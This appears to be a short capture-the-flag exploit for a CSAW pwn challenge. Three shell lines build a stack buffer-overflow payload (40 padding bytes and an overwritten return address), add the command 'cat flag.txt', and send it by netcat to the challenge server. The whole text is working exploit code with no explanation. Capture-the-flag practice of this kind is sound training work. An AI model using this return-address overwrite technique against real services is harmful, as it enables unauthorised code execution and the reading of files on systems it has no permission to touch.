python -c "from struct import pack; print 'A' * 40 + pack('L', 0x4005b6)" > payload
echo "cat flag.txt" >> payload
cat payload - | nc pwn.chal.csaw.io 9001
